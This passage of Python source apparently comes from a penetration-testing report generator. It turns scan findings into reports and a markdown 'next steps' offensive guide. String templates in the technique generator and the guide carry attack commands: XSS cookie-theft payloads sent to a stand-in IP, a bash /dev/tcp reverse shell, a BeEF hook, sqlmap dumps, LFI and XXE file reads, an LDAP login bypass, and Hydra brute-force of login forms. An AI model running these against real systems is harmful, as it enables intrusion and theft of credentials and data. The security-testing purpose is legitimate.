                   'LOW': 'Scheduled', 'INFO': 'Scheduled'}.get(sev.upper(), 'Scheduled')
            return {'recommendation': ('Investigate against vendor guidance, apply the fix, '
                                       'and re-test to confirm remediation.'),
                    'timeline': _tl}

        for vuln in vulnerabilities or []:
            if not isinstance(vuln, dict):
                continue
            vtype = vuln.get('type', 'General Finding')
            confirmed_url = vuln.get('url', '')
            payload = vuln.get('payload', '')
            sev = str(vuln.get('severity', 'UNKNOWN'))

            if vtype not in details:
                kb = _kb_for(vtype)
                url_specific_techniques = self._generate_url_specific_techniques(
                    kb['attack_techniques'], confirmed_url, payload, vtype,
                    verification=vuln.get('verification'),
                )
                rec = _rec_for(vtype, sev)
                details[vtype] = {
                    'description': kb['description'],
                    'attack_techniques': url_specific_techniques,
                    'attacker_gains': kb['attacker_gains'],
                    'tools': kb['tools'],
                    'assets_affected': [],
                    'severity': sev,
                    'remediation': rec.get('recommendation', ''),
                    'timeline': rec.get('timeline', 'Scheduled'),
                    'confirmed_findings': [],
                    'verified_count': 0,
                    'unverified_count': 0,
                }

            if confirmed_url and confirmed_url not in details[vtype]['assets_affected']:
                details[vtype]['assets_affected'].append(confirmed_url)

            verification = vuln.get('verification')
            vstatus = (str(verification.get('status') or '')
                       if isinstance(verification, dict) else '')
            verified = bool(vuln.get('verified')) or vstatus.lower() in (
                'confirmed', 'success')
            vstat = str(vuln.get('verification_status') or '')
            if not vstat:
                vstat = 'confirmed' if verified else 'unverified'
            # Exploitation-runner inconclusive stays inconclusive — never
            # presented as a full finding; the HTML groups it separately.
            if vstatus.lower() == 'inconclusive' or vstat.lower() == 'inconclusive':
                vstat = 'inconclusive'
                verified = False
            if verified:
                details[vtype]['verified_count'] += 1
            else:
                details[vtype]['unverified_count'] += 1
            ev = vuln.get('evidence')
            try:
                ev_str = (', '.join(f'{k}={v}' for k, v in list(ev.items())[:4])
                          if isinstance(ev, dict) and ev else '')
            except Exception:
                ev_str = ''
            details[vtype]['confirmed_findings'].append({
                'url': confirmed_url,
                'payload': payload,
                'description': vuln.get('description', ''),
                'verified': verified,
                'verification_status': vstat,
                'confidence': str(vuln.get('confidence', 'medium' if verified else 'low')),
                'evidence': ev_str,
                'verification_detail': (verification.get('evidence', {}).get('description', '')
                                        if isinstance(verification, dict) else ''),
            })

        return details

    @staticmethod
    def _verification_lines(verification: Optional[Dict]) -> List[str]:
        """Markdown lines for Athena's automated verification evidence.

        Only a *confirmed* result qualifies.  ``possible`` and ``inconclusive``
        attempts are not proof, and the operator-facing manual steps built on
        top of this must never be framed as verified.
        """
        if not isinstance(verification, dict):
            return []
        status = str(verification.get('status') or '').strip()
        if status.lower() not in ('confirmed', 'success'):
            return []

        lines = [f"**Automated verification (Athena):** {status.upper()}"]
        evidence = verification.get('evidence')
        if isinstance(evidence, dict):
            description = evidence.get('description') or evidence.get('detail')
            if description:
                lines.append(f"**Evidence:** {description}")
            if evidence.get('payload'):
                lines.append(f"**Evidence payload:** `{evidence.get('payload')}`")
        elif isinstance(evidence, str) and evidence.strip():
            lines.append(f"**Evidence:** {evidence.strip()}")
        return lines

    def _generate_url_specific_techniques(self, base_techniques: List[str], 
                                          url: str, payload: str, vtype: str,
                                          verification: Optional[Dict] = None) -> List[str]:
        """Generate URL-specific exploitation steps with actual payloads."""
        prefix = self._verification_lines(verification)
        if not url:
            return prefix + list(base_techniques)
        
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        params = urllib.parse.parse_qs(parsed.query)
        
        techniques = []
        
        # Generate specific commands based on vulnerability type
        if 'SQL Injection' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            if payload:
                techniques.append(f"**Detected payload:** `{payload}`")
                techniques.append(f"**Manual test:** Open `{url}` in browser or Burp Suite to verify the injection point")
                techniques.append(f"**sqlmap command:** `sqlmap -u \"{url}\" --batch --dbs --dump`")
                techniques.append(f"**Extract databases:** `sqlmap -u \"{url}\" --batch --dbs`")
                techniques.append(f"**Dump specific table:** `sqlmap -u \"{url}\" --batch -T users --dump`")
            else:
                techniques.append(f"**Test with:** `sqlmap -u \"{base_url}{path}?id=1\" --batch --dbs`")
        
        elif 'SSRF' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            if payload:
                techniques.append(f"**Detected payload:** `{payload}`")
                techniques.append(f"**Verify with curl:** `curl -v \"{url}\"`")
                techniques.append(f"**Cloud metadata test:** `curl -v \"{base_url}{path}?{list(params.keys())[0] if params else 'url'}=http://169.254.169.254/latest/meta-data/\"`")
            else:
                techniques.append(f"**Test with:** `curl -v \"{base_url}{path}?url=http://127.0.0.1\"`")
        
        elif 'XSS' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            if payload:
                techniques.append(f"**Detected payload:** `{payload}`")
                techniques.append(f"**Cookie theft:** Inject `<script>fetch(\"http://YOUR-IP/c?c=\"+document.cookie)</script>`")
                techniques.append(f"**Session hijack:** `curl -H \"Cookie: session=STOLEN\" {url}`")
        
        elif 'LFI' in vtype or 'Path Traversal' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            if payload:
                techniques.append(f"**Detected payload:** `{payload}`")
                techniques.append(f"**Read passwd:** `curl \"{base_url}{path}?{list(params.keys())[0] if params else 'page'}=../../../../etc/passwd\"`")
                techniques.append(f"**PHP source:** `curl \"{base_url}{path}?{list(params.keys())[0] if params else 'page'}=php://filter/convert.base64-encode/resource=config.php\"`")
        
        elif 'Command Injection' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            if payload:
                techniques.append(f"**Detected payload:** `{payload}`")
                techniques.append(f"**Verify:** `curl \"{url}\"`")
                techniques.append(f"**Reverse shell:** `; bash -i >& /dev/tcp/YOUR-IP/4444 0>&1`")
        
        elif 'XXE' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            if payload:
                techniques.append(f"**Detected payload:** `{payload}`")
                techniques.append(f"**Extract files:** Send POST with `<!DOCTYPE x [<!ENTITY f SYSTEM \"file:///etc/passwd\">]>`")
        
        elif 'CRLF Injection' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            if payload:
                techniques.append(f"**Detected payload:** `{payload}`")
                techniques.append(f"**Header injection:** `curl -v \"{base_url}{path}?{list(params.keys())[0] if params else 'url'}=%0d%0aSet-Cookie:%20admin=true\"`")
        
        elif 'Open Redirect' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            if payload:
                techniques.append(f"**Detected payload:** `{payload}`")
                techniques.append(f"**OAuth theft:** `https://target.com{path}?redirect=https://attacker.com/`")
        
        elif 'CSRF' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            techniques.append(f"**Exploit:** Create a malicious page with auto-submitting form targeting this URL")
            techniques.append(f"**Test with:** Burp Suite -> Intruder -> Repeater")
        
        elif 'LDAP Injection' in vtype:
            techniques.append(f"**Target URL:** `{url}`")
            if payload:
                techniques.append(f"**Detected payload:** `{payload}`")
                techniques.append(f"**Bypass auth:** Inject `*)(uid=*))(|(uid=*` to bypass login")
        
        else:
            # Use base techniques with URL context
            techniques = [f"**Target URL:** `{url}`"] + base_techniques
        
        return prefix + techniques

    def _generate_compliance_summary(self, vulnerabilities: List[Dict], results: Dict) -> Dict:
        """Map vulnerabilities to GDPR/PCI-DSS compliance frameworks."""
        gdpr_issues = []
        pci_issues = []
        
        for v in vulnerabilities:
            vtype = v.get('type', '')
            if any(k in vtype for k in ['XSS', 'Injection', 'Authentication']):
                gdpr_issues.append(f"Art 32: Inadequate technical measures to protect data integrity ({vtype})")
            
            if 'SQL Injection' in vtype:
                pci_issues.append(f"Req 6.5.1: Critical SQL Injection vulnerability identified")
            if 'Authentication' in vtype or 'Weak Credentials' in vtype:
                pci_issues.append(f"Req 8.2: Weak authentication/password management")
                
        # Check for encrypted communication
        target = results.get('target', '')
        if target.startswith('http://'):
            gdpr_issues.append("Art 32: Data transmitted in cleartext (HTTP)")
            pci_issues.append("Req 4.1: Use strong cryptography for sensitive data transmit")

        return {
            'gdpr_assessment': {
                'status': 'NON-COMPLIANT' if gdpr_issues else 'NOT_ASSESSED',
                'findings': (list(set(gdpr_issues)) or [
                    'No GDPR-relevant issues detected by automated checks; '
                    'a manual compliance assessment is still required.'])
            },
            'pci_dss_assessment': {
                'status': 'FAIL' if pci_issues else 'NOT_ASSESSED',
                'findings': (list(set(pci_issues)) or [
                    'No PCI DSS-relevant issues detected by automated checks; '
                    'a manual compliance assessment is still required.'])
            }
        }

    def _dedup_vulnerabilities(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """Severity-sorted, (type, url)-deduplicated copy of the findings.

        Returns a new list: the caller's data is never reordered in place.
        """
        seen = set()
        deduplicated = []

        # A single None (failed merge upstream) used to kill the whole
        # report with AttributeError - drop non-dicts, log, continue.
        clean = [v for v in (vulnerabilities or []) if isinstance(v, dict)]
        if len(clean) != len(vulnerabilities or []):
            logging.getLogger(__name__).debug(
                'dedup dropped %d non-dict finding(s)',
                len(vulnerabilities or []) - len(clean))

        # Sort by severity (CRITICAL first)
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
        ordered = sorted(
            clean,
            key=lambda x: severity_order.get(x.get('severity', 'INFO'), 5),
        )

        for vuln in ordered:
            key = (vuln.get('type'), vuln.get('url'))
            if key not in seen:
                seen.add(key)
                deduplicated.append(vuln)

        return deduplicated

    def _filter_important_vulnerabilities(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """Filter and deduplicate vulnerabilities for auditor clarity."""
        return self._dedup_vulnerabilities(vulnerabilities)[:self.MAX_REPORT_FINDINGS]

    def _deduplicate_exploitation_results(self, results: List[Dict]) -> List[Dict]:
        """Cleanup exploitation logs for the report.

        Accepts both the raw handler status (``SUCCESS``/``CONFIRMED``) and
        the runner's classification (``confirmed``): either way the entry
        represents a demonstrated vulnerability.  ``possible`` and
        ``inconclusive`` attempts are not demonstrations and are dropped.
        """
        seen = set()
        unique = []
        for res in results or []:
            if not isinstance(res, dict):
                continue
            status = str(res.get('status') or '').strip().upper()
            key = (res.get('type'), res.get('url'))
            if key not in seen and status in ('SUCCESS', 'CONFIRMED'):
                seen.add(key)
                unique.append(res)
        return unique

    def export_to_csv(self, results: Dict[str, Any], filename: str) -> None:
        """Export vulnerabilities to standard CSV."""
        vulns = results.get('vulnerabilities', [])
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=['Type', 'Severity', 'URL', 'Description'])
            writer.writeheader()
            for v in vulns or []:
                if not isinstance(v, dict):
                    continue
                writer.writerow({
                    'Type': v.get('type', ''),
                    'Severity': v.get('severity', ''),
                    'URL': v.get('url', ''),
                    'Description': v.get('description', '')
                })

    def export_to_xml(self, results: Dict[str, Any], filename: str) -> None:
        """Export results to XML."""
        root = ET.Element("audit_results")
        target = ET.SubElement(root, "target")
        target.text = results.get('target', 'unknown')
        
        vulns_elem = ET.SubElement(root, "findings")
        for v in results.get('vulnerabilities', []) or []:
            if not isinstance(v, dict):
                continue
            v_elem = ET.SubElement(vulns_elem, "finding")
            for key, val in v.items():
                child = ET.SubElement(v_elem, key)
                child.text = str(val)
        
        
        ET.ElementTree(root).write(filename)

    def generate_offensive_guide(self, results: Dict[str, Any]) -> str:
        """Generate a markdown guide on next offensive testing steps based on findings."""
        target = results.get('target', 'Unknown')
        vulns = results.get('vulnerabilities', [])
        discovery = results.get('discovery', {})
        target_domain = target.replace('https://', '').replace('http://', '').split('/')[0].split(':')[0]

        md = [f"# Next Steps Guide: {target}", ""]
        md.append("This guide outlines explicit next steps for a penetration tester to manually verify and exploit the findings.")
        md.append("Each section lists the exact tools and commands to run.")
        md.append("")

        # ------------------------------------------------------------------
        # 1. Admin Panels & High-Value Targets (cPanel, Webmail, WHM)
        # ------------------------------------------------------------------
        admin_panels = discovery.get('admin_panels', [])
        if admin_panels:
            md.append("## 1. HIGH-VALUE TARGETS: Admin Panels & Webmail")
            md.append("**These are priority targets - compromise here gives admin access:**")
            md.append("")
            for panel in admin_panels:
                panel_type = panel.get('panel_type', 'UNKNOWN')
                url = panel.get('url', '')
                status = panel.get('status', '')
                md.append(f"- **[{panel_type}]** `{url}` (HTTP {status})")
            md.append("")
            
            md.append("**Attack strategies for admin panels:**")
            md.append("")
            md.append("### cPanel / WHM")
            md.append("- Default port: 2083 (cPanel), 2087 (WHM)")
            md.append("- Try default credentials: `root:password`, `admin:admin`")
            md.append("- Use `hydra` for SSH bruteforce if port 22 is open")
            md.append("- Check for backup file download vulnerabilities")
            md.append("")
            md.append("### Webmail")
            md.append("- Roundcube: `/webmail/` or `/roundcube/`")
            md.append("- SquirrelMail: `/squirrelmail/` or `/webmail2/`")
            md.append("- Horde: `/horde/` or `/imp/`")
            md.append("- Try common credentials: `admin@domain:password`, `user@domain:password`")
            md.append("- Check for IMAP/POP3 bruteforce on port 993/995")
            md.append("")
            md.append("### phpMyAdmin")
            md.append("- Try MySQL root credentials: `root:`, `root:root`, `root:password`")
            md.append("- Check for SQL injection in login form")
            md.append("- Look for exposed phpMyAdmin configuration files")
            md.append("")

        # ------------------------------------------------------------------
        # 2. Credential Bruteforcing / Spraying
        # ------------------------------------------------------------------
        login_forms = discovery.get('login_forms', [])
        if login_forms:
            md.append("## 2. Credential Bruteforcing / Spraying")
            md.append("Login forms were discovered. Follow these steps to attempt credential attacks:")
            md.append("")
            for i, form in enumerate(login_forms, 1):
                form_url = form.get('url', '')
                form_type = form.get('form_type', 'unknown')
                source = form.get('source', '')
                inputs = [inp.get('name') for inp in form.get('inputs', []) if inp.get('name')]
                priority = form.get('priority', 'medium')
                
                md.append(f"### Target {i}: `{form_url}`")
                md.append(f"- **Type**: {form_type} | **Source**: {source} | **Priority**: {priority}")
                md.append(f"- **Detected parameters**: `{'`, `'.join(inputs) if inputs else '(none detected)'}`")
                md.append("")
                md.append("**Step-by-step:**")
                md.append("")
                md.append("1. **Manual recon with Burp Suite**")
                md.append("   - Open Burp Suite → Proxy → Intercept is on")
                md.append("   - Submit the form once and inspect the POST body in Burp")
                md.append("   - Right-click the request → Send to Intruder (Ctrl+I)")
                md.append("   - Set positions on the username and password fields")
                md.append("   - Payloads tab → Load wordlist (e.g. `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`)")
                md.append("   - Start attack and filter responses by length/status code")
                md.append("")
                md.append("2. **Automated bruteforce with Hydra**")
                md.append("   ```bash")
                md.append(f"   hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \\")
                md.append(f"         -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \\")
                md.append(f"         {form_url.split('://')[-1].split('/')[0]} http-post-form \"{form_url}:{inputs[0] if inputs else 'user'}=^USER^&{inputs[1] if len(inputs) > 1 else 'pass'}=^PASS^:F=incorrect\"")
                md.append("   ```")
                md.append("")
                md.append("3. **Alternate: FFuF for form bruteforce**")
                md.append("   ```bash")
                md.append(f"   ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \\")
                md.append(f"        -X POST -d \"{inputs[0] if inputs else 'user'}=admin&{inputs[1] if len(inputs) > 1 else 'pass'}=FUZZ\" \\")
                md.append(f"        -H \"Content-Type: application/x-www-form-urlencoded\" \\")
                md.append(f"        -u {form_url} -fc 401,403")
                md.append("   ```")
                md.append("")
                md.append("4. **Capture traffic with Wireshark / tcpdump** (to analyse auth flow)")
                md.append("   ```bash")
                md.append(f"   sudo tcpdump -i eth0 host {target_domain} -w auth_capture.pcap")
                md.append("   # Then open auth_capture.pcap in Wireshark and filter: http.request.method == POST")
                md.append("   ```")
                md.append("")
                md.append("5. **Credential spraying across subdomains**")
                md.append("   - Use the same password with multiple usernames to avoid lockout")
                md.append("   - Tool: `spray.sh` or `kerbrute` for Active Directory environments")
                md.append("")

        # ------------------------------------------------------------------
        # 3. Subdomain Enumeration & Review
        # ------------------------------------------------------------------
        subdomains = discovery.get('subdomains', [])
        if subdomains:
            md.append("## 3. Subdomain Enumeration & Review")
            md.append("The following subdomains were discovered. Investigate each with these steps:")
            md.append("")
            for sub in subdomains[:10]:
                sub_clean = sub.replace('https://', '').replace('http://', '').split('/')[0]
                md.append(f"- `{sub}`")
            if len(subdomains) > 10:
                md.append(f"- ... and {len(subdomains)-10} more.")
            md.append("")
            md.append("**Step-by-step for each subdomain:**")
            md.append("")
            md.append("1. **Probe with curl** to check HTTP response")
            md.append("   ```bash")
            md.append(f"   curl -s -I https://{subdomains[0].replace('https://','').replace('http://','').split('/')[0]} | head -20")
            md.append("   ```")
            md.append("")
            md.append("2. **Port scan with Nmap**")
            md.append("   ```bash")
            md.append(f"   nmap -sV -sC -p- --min-rate=1000 {target_domain} -oN subdomain_scan.txt")
            md.append("   ```")
            md.append("")
            md.append("3. **Technology fingerprint with WhatWeb**")
            md.append("   ```bash")
            md.append(f"   whatweb {target_domain} --aggression=3")
            md.append("   ```")
            md.append("")
            md.append("4. **Capture HTTP traffic with Wireshark**")
            md.append("   ```bash")
            md.append(f"   sudo tcpdump -i eth0 -w subdomain_traffic.pcap host {target_domain}")
            md.append("   # Analyse in Wireshark with: http.request || http.response")
            md.append("   ```")
            md.append("")
            md.append("5. **Directory busting with Gobuster/FFuF** on each responding subdomain")
            md.append("   ```bash")
            md.append(f"   gobuster dir -u https://{subdomains[0].replace('https://','').replace('http://','').split('/')[0]} \\")
            md.append("        -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50")
            md.append("   ```")
            md.append("")
            md.append("6. **SSL/TLS inspection with OpenSSL**")
            md.append("   ```bash")
            md.append(f"   openssl s_client -connect {target_domain}:443 -servername {target_domain} 2>&1 | openssl x509 -text")
            md.append("   ```")
            md.append("")

        # ------------------------------------------------------------------
        # 4. Port Scanning & Service Enumeration
        # ------------------------------------------------------------------
        open_ports = discovery.get('ports', [])
        if open_ports:
            md.append("## 4. Port Scanning & Service Enumeration")
            md.append("The following open ports were detected. Perform deep reconnaissance on each:")
            md.append("")

            port_recon_tools = {
                21: {'service': 'FTP', 'recon_cmds': 'nmap -p 21 --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor -sV <target>', 'tools': 'Hydra/Medusa for bruteforce, FileZilla for anonymous access, Wireshark to capture FTP credentials in plaintext'},
                22: {'service': 'SSH', 'recon_cmds': 'nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos -sV <target>', 'tools': 'Hydra for bruteforce, ssh-audit for cipher review, nc/ncat for banner grab'},
                23: {'service': 'Telnet', 'recon_cmds': 'nmap -p 23 --script telnet-ntlm-info -sV <target>', 'tools': 'Hydra for bruteforce, Wireshark to capture plaintext telnet traffic'},
                25: {'service': 'SMTP', 'recon_cmds': 'nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344 -sV <target>', 'tools': 'swaks/sendmail for email sending, ncat for manual SMTP conversation'},
                53: {'service': 'DNS', 'recon_cmds': 'nmap -p 53 --script dns-zone-transfer,dns-brute -sV <target>', 'tools': 'dig, nslookup, dnsrecon, Wireshark for DNS traffic analysis'},
                80: {'service': 'HTTP', 'recon_cmds': 'nmap -p 80 --script http-enum,http-headers,http-methods,http-webdav-scan -sV <target>', 'tools': 'curl for manual probing, gobuster/ffuf for dir busting, whatweb for fingerprinting, nikto for vuln scan, Wireshark for HTTP traffic capture'},
                110: {'service': 'POP3', 'recon_cmds': 'nmap -p 110 --script pop3-capabilities -sV <target>', 'tools': 'Hydra for bruteforce, ncat for manual POP3 commands'},
                143: {'service': 'IMAP', 'recon_cmds': 'nmap -p 143 --script imap-capabilities -sV <target>', 'tools': 'Hydra for bruteforce, ncat for manual IMAP commands'},
                389: {'service': 'LDAP', 'recon_cmds': 'nmap -p 389 --script ldap-rootdse -sV <target>', 'tools': 'ldapsearch, JXplorer, Wireshark for LDAP query analysis'},
                443: {'service': 'HTTPS', 'recon_cmds': 'nmap -p 443 --script http-enum,http-headers,http-methods,ssl-enum-ciphers,ssl-heartbleed -sV <target>', 'tools': 'curl/wget for probes, gobuster/ffuf, whatweb, nikto, testssl.sh, sslyze, Wireshark for TLS handshake analysis'},
                445: {'service': 'SMB', 'recon_cmds': 'nmap -p 445 --script smb-enum-shares,smb-os-discovery,smb-vuln-ms17-010 -sV <target>', 'tools': 'smbclient, smbmap, Impacket (smbexec.py, psexec.py), CrackMapExec, enum4linux'},
                993: {'service': 'IMAPS', 'recon_cmds': 'nmap -p 993 --script imap-capabilities,ssl-enum-ciphers -sV <target>', 'tools': 'Hydra, openssl s_client for manual connection'},
                995: {'service': 'POP3S', 'recon_cmds': 'nmap -p 995 --script pop3-capabilities,ssl-enum-ciphers -sV <target>', 'tools': 'Hydra, openssl s_client for manual connection'},
                1433: {'service': 'MSSQL', 'recon_cmds': 'nmap -p 1433 --script ms-sql-info,ms-sql-empty-password -sV <target>', 'tools': 'sqsh, Impacket mssqlclient.py, Hydra'},
                1521: {'service': 'Oracle DB', 'recon_cmds': 'nmap -p 1521 --script oracle-sid-brute,oracle-tns-version -sV <target>', 'tools': 'odat.py for Oracle assessment, sqlplus'},
                2049: {'service': 'NFS', 'recon_cmds': 'nmap -p 2049 --script nfs-ls,nfs-statfs,nfs-showmount -sV <target>', 'tools': 'showmount -e <target>, mount -t nfs'},
                3306: {'service': 'MySQL', 'recon_cmds': 'nmap -p 3306 --script mysql-empty-password,mysql-users,mysql-vuln-cve2012-2122 -sV <target>', 'tools': 'mysql CLI, Hydra, Wireshark for MySQL query capture'},
                3389: {'service': 'RDP', 'recon_cmds': 'nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 -sV <target>', 'tools': 'xfreerdp, Remmina, Crowbar for bruteforce, BlueKeep RDP checker'},
                5432: {'service': 'PostgreSQL', 'recon_cmds': 'nmap -p 5432 --script pgsql-brute -sV <target>', 'tools': 'psql CLI, Hydra, Wireshark for query capture'},
                5900: {'service': 'VNC', 'recon_cmds': 'nmap -p 5900 --script vnc-info,vnc-title -sV <target>', 'tools': 'vncviewer, Hydra'},
                6379: {'service': 'Redis', 'recon_cmds': 'nmap -p 6379 --script redis-info -sV <target>', 'tools': 'redis-cli, Hydra'},
                8080: {'service': 'HTTP-Alt', 'recon_cmds': 'nmap -p 8080 --script http-enum,http-headers,http-methods -sV <target>', 'tools': 'curl, gobuster/ffuf, whatweb, nikto, Wireshark'},
                8443: {'service': 'HTTPS-Alt', 'recon_cmds': 'nmap -p 8443 --script http-enum,http-headers,http-methods,ssl-enum-ciphers -sV <target>', 'tools': 'curl, gobuster/ffuf, whatweb, nikto, testssl.sh, Wireshark'},
                9000: {'service': 'HTTP-Alt2', 'recon_cmds': 'nmap -p 9000 --script http-enum,http-headers -sV <target>', 'tools': 'curl, whatweb'},
                9090: {'service': 'HTTP-Alt3', 'recon_cmds': 'nmap -p 9090 --script http-enum,http-headers -sV <target>', 'tools': 'curl, whatweb'},
                27017: {'service': 'MongoDB', 'recon_cmds': 'nmap -p 27017 --script mongodb-databases -sV <target>', 'tools': 'mongo CLI, NoSQLMap, Hydra'},
            }

            for port in ports:
                info = port_recon_tools.get(port, {})
                service = info.get('service', 'Unknown')
                md.append(f"### Port {port} — {service}")
                if info:
                    md.append(f"- **Nmap deep scan**: `{info['recon_cmds']}`")
                    md.append(f"- **Manual banner grab**: `echo | ncat {target_domain} {port}` or `curl -sI http://{target_domain}:{port}` (for HTTP ports)")
                    md.append(f"- **Recommended tools**: {info['tools']}")
                else:
                    md.append(f"- **Nmap deep scan**: `nmap -p {port} -sV -sC {target_domain}`")
                    md.append(f"- **Manual banner grab**: `echo | ncat {target_domain} {port}`")
                md.append("")

            md.append("**Step-by-step for all ports:**")
            md.append("")
            md.append("1. Run comprehensive nmap across all open ports:")
            md.append("   ```bash")
            md.append(f"   nmap -p {','.join(str(p) for p in ports)} -sV -sC -O --reason {target_domain} -oN full_port_scan.txt")
            md.append("   ```")
            md.append("")
            md.append("2. Capture service banners with ncat:")
            md.append("   ```bash")
            md.append(f"   for port in {','.join(str(p) for p in ports)}; do echo \"=== Port $port ===\"; echo | ncat -w 3 {target_domain} $port 2>&1; done")
            md.append("   ```")
            md.append("")
            md.append("3. Capture and analyse traffic with Wireshark:")
            md.append("   ```bash")
            md.append(f"   sudo tcpdump -i eth0 -s 0 -w port_scan.pcap host {target_domain}")
            md.append("   # Open in Wireshark, use Statistics → Endpoints to see all services")
            md.append("   # Filter: tcp.port == <port_number> to isolate specific service traffic")
            md.append("   ```")
            md.append("")

        # ------------------------------------------------------------------
        # 5. Source Code Analysis (Secrets & Comments)
        # ------------------------------------------------------------------
        secrets = discovery.get('source_analysis', {}).get('secrets', [])
        comments = discovery.get('source_analysis', {}).get('comments', [])
        if secrets or comments:
            md.append("## 5. Source Code Analysis")
            if secrets:
                md.append("### Discovered Secrets")
                md.append("Potential secrets were found in JavaScript/CSS files. Follow these steps:")
                for secret in secrets[:10]:
                    md.append(f"- **Type**: `{secret.get('type')}`")
                    md.append(f"  - **File**: `{secret.get('file')}`")
                    md.append(f"  - **Value**: `{secret.get('value')}`")
                    md.append(f"  - **Context**: `{secret.get('snippet')}`")
                if len(secrets) > 10:
                    md.append(f"- ... and {len(secrets)-10} more secrets.")
                md.append("")
                md.append("**Step-by-step:**")
                md.append("")
                md.append("1. **Fetch the full file** with curl and grep for secrets:")
                md.append("   ```bash")
                md.append(f"   curl -s \"{secrets[0].get('file', target)}\" | grep -Eoi '(api[Kk]ey|[Aa]ccess[Kk]ey|[Ss]ecret|[Tt]oken|password|auth|jwt|bearer)' | sort -u")
                md.append("   ```")
                md.append("")
                md.append("2. **Decode base64-encoded secrets** if found:")
                md.append("   ```bash")
                md.append('   echo "base64_encoded_string" | base64 -d')
                md.append("   ```")
                md.append("")
                md.append("3. **Validate API keys** with targeted requests:")
                md.append("   ```bash")
                md.append(f"   # For Google/Firebase API keys:")
                md.append(f"   curl -s \"https://firebaseremoteconfig.googleapis.com/v1/projects/0/namespaces/0:fetch?key=AIzaSy...\"")
                md.append(f"   # For AWS keys - use AWS CLI:")
                md.append("   aws sts get-caller-identity --access-key AKIA... --secret-key ...")
                md.append("   ```")
                md.append("")
                md.append("4. **Check secrets against known services** with Postman or custom scripts")
                md.append("")
                md.append("5. **Use Wireshark** to check if secrets are transmitted in cleartext:")
                md.append("   ```bash")
                md.append(f"   sudo tcpdump -i eth0 -w secrets_capture.pcap host {target_domain}")
                md.append('   # In Wireshark, search for: apiKey, secret, token, password')
                md.append("   ```")
                md.append("")

            if comments:
                md.append("### Interesting Source Code Comments")
                md.append("The following comments may reveal sensitive functionality or debug endpoints:")
                for comment in comments[:10]:
                    md.append(f"- **Type**: `{comment.get('type')}`")
                    md.append(f"  - **File**: `{comment.get('file')}`")
                    md.append(f"  - **Text**: `{comment.get('text')}`")
                if len(comments) > 10:
                    md.append(f"- ... and {len(comments)-10} more comments.")
                md.append("")
                md.append("**Step-by-step:**")
                md.append("")
                md.append("1. **Fetch and extract comments** from the source file:")
                md.append("   ```bash")
                md.append(f"   curl -s \"{comments[0].get('file', target)}\" | grep -E '(TODO|FIXME|HACK|BUG|XXX|NOTE|REVIEW|OPTIMIZE|CHANGE)'")
                md.append("   ```")
                md.append("")
                md.append("2. **Probe discovered paths** from comments with curl:")
                md.append("   ```bash")
                md.append(f"   # For any URL-like paths in comments, probe them:")
                md.append("   curl -s -o /dev/null -w \"%{{http_code}}\" \"http://{target_domain}/discovered/path\"")
                md.append("   ```")
                md.append("")

        # ------------------------------------------------------------------
        # 6. Vulnerability Exploitation
        # ------------------------------------------------------------------
        critical_vulns = [v for v in vulns if v.get('severity') == 'CRITICAL']
        high_vulns = [v for v in vulns if v.get('severity') == 'HIGH']
        
        if critical_vulns or high_vulns:
            md.append("## 6. Vulnerability Exploitation")
            for vuln in critical_vulns + high_vulns:
                vtype = vuln.get('type', '')
                url = vuln.get('url', '')
                md.append(f"### {vtype} at `{url}`")
                md.append("")

                if 'SQL Injection' in vtype or 'SQLi' in vtype:
                    md.append("1. **Automated extraction with sqlmap**:")
                    md.append("   ```bash")
                    md.append(f"   sqlmap -u \"{url}\" --dbs --batch --random-agent --level 3 --risk 2")
                    md.append(f"   sqlmap -u \"{url}\" -D <dbname> -T <table> --dump --batch")
                    md.append("   ```")
                    md.append("")
                    md.append("2. **Manual verification with curl**:")
                    md.append("   ```bash")
                    md.append(f"   curl -s \"{url}' OR '1'='1\" | head -50")
                    md.append(f"   curl -s \"{url}' UNION SELECT 1,2,3,database(),5,6,7,8-- -\" | head -50")
                    md.append("   ```")
                    md.append("")
                    md.append("3. **Capture DB response in Wireshark** to analyse query structure:")
                    md.append("   ```bash")
                    md.append(f"   sudo tcpdump -i eth0 -w sqli_capture.pcap host {target_domain}")
                    md.append("   # Filter: tcp.port == 80 || tcp.port == 443")
                    md.append("   # Look for SQL error messages in the response payload")
                    md.append("   ```")
                    md.append("")

                elif 'XSS' in vtype or 'Cross-Site' in vtype or 'Cross Site' in vtype:
                    md.append("1. **Set up a listener with ncat**:")
                    md.append("   ```bash")
                    md.append("   ncat -lnvp 8080")
                    md.append("   ```")
                    md.append("")
                    md.append("2. **Inject XSS payload** into the vulnerable parameter:")
                    md.append("   ```bash")
                    md.append(f"   curl -s \"{url}<script>new Image().src='http://YOUR_IP:8080/steal?c='+document.cookie</script>\"")
                    md.append("   ```")
                    md.append("")
                    md.append("3. **Advanced: BeEF hook** for persistent browser control:")
                    md.append("   ```bash")
                    md.append("   # Inject: <script src='http://YOUR_IP:3000/hook.js'></script>")
                    md.append("   # Then launch BeEF: beef-xss")
                    md.append("   ```")
                    md.append("")
                    md.append("4. **Capture traffic with Wireshark** (watch for the XSS callback):")
                    md.append("   ```bash")
                    md.append("   sudo tcpdump -i eth0 -w xss_callback.pcap src port 8080")
